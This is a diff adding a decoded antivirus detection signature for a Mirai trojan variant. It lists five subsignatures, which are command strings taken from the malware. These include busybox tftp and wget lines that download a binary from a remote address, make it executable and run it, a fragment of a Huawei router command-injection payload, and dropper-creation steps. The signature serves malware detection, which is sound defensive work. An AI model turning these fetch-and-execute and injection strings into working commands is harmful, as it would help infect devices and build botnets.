@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-7369580-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1|2|3|4)>3,4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox tftp -g -l .z.binary -r %s %d.%d.%d.%d; /bin/busybox chmod 777 .z.binary;./.z.binary tftp.%s; /bin/busybox LMAO
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox wget http://%d.%d.%d.%d/%s -O- >.z.binary; /bin/busybox chmod 777 .z.binary;./.z.binary wget.%s; /bin/busybox LMAO
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+-g %s -l /tmp/.xz -r /mips; /bin/busybox chmod +x /tmp/.xz; /tmp/.xz huawei.mips)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUP
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox cp /bin/busybox .z.dropper; >.z.dropper; /bin/busybox chmod 777 .z.dropper; /bin/busybox LMAO
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+./.z.dropper; ./.z.binary echo.%s; /bin/busybox LMAO
